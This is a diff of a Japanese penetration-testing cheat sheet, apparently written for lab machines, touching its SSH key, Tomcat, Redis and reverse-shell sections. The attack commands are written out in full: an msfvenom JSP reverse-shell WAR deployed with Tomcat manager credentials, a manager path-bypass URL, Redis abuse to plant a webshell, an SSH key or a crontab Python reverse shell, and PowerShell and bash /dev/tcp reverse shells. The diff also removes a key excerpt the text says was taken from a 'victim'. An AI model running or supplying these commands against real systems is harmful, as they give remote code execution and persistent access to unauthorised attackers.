@@ -129,17 +129,6 @@ chmod 600 id_rsa
 - -b...ビット数の固定(-t rsa -b 4096など)
 - -f...ファイル名(id_????の?部分)
 
-victimからid_rsaを取得してコピーした際には、最後に改行を入れておく。
-```
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-YG6tmwVeTbhkycXMbEVeIsG0a42Yj1ywrq5GyXKYaFr3DnDITcqLbdxIIEdH1vrRjYynVM
----snip---
-ueX7aq9pIXhcGT6M9CGUJjyEkvOrx+HRD4TKu0lGcO3LVANGPqSfks4r5Ea4LiZ4Q4YnOJ
-u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
------END OPENSSH PRIVATE KEY-----ここに改行
-```
-
 ### 公開鍵認証方式でsshログイン
 ```
 cat id_rsa.pub >> ~/.ssh/authorized_keys
@@ -671,17 +660,14 @@ Response.write("</pre><!-"&"-") %>
 ```
 
 ### Tomcat
+#### RCE
 ```
 /usr/share/tomcat9/etc/tomcat-users.xml
 ```
-
-#### RCE
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 -f war -o shell.war
-
 curl --user 'tomcat':'$3cureP4s5w0rd123!' --upload-file shell.war "http://10.10.10.1:8080/manager/text/deploy?path=/shell"
 nc -lvnp 443
-
 curl --user 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.1:8080/shell/
 ```
 
@@ -707,7 +693,7 @@ with open('tomcat-betterdefaultpasslist.txt') as f:
 #### Tomcat + リバースプロキシ(Apache,Nginx,IIS)
 ```
 http://example.com/manager/html
-http://example.com/manager/;/html
+http://example.com/manager;name=aaaa/html
 ```
 
 ### ShellShock(CVE-2014-6271)
@@ -1397,11 +1383,12 @@ grant all privileges on test_db.* to <username>@<host name> IDENTIFIED BY <passw
 ```
 
 ## Redis(6379)
+接続:
 ```
 redis-cli -h 10.10.10.160
 ```
 
-### Webshell
+Webshell:  
 Webサイトのディクレクトリ配下に書き込み権限がある場合に任意のPHPを仕込める。
 ```
 kali@kali:~# redis-cli -h 10.10.10.160
@@ -1415,7 +1402,8 @@ OK
 OK
 ```
 
-### SSH
+
+SSH:  
 "config get dir"コマンドによりredisユーザのhomeを確認できる。  
 これにより.ssh配下に書き込み権限がある場合に公開鍵を配置してやることでアクセスが可能になる。
 ```
@@ -1438,7 +1426,7 @@ OK
 kali@kali:~# ssh -i id_rsa redis@10.10.10.160
 ```
 
-### Crontab
+Crontab:  
 /var/spool/cron/crontabsにアクセスできる場合、以下の方法でreverse shellを取得可能。
 ```
 kali@kali:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.1603\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.10.10.160 -x set 1
@@ -1521,14 +1509,6 @@ ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-Str
 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
 ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
 lient.Close()"
-```
-
-### Ansible
-```
-- hosts: localhost
-  tasks:
-  - name: rev
-    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'
 ```
 
 ## ^msfvenom
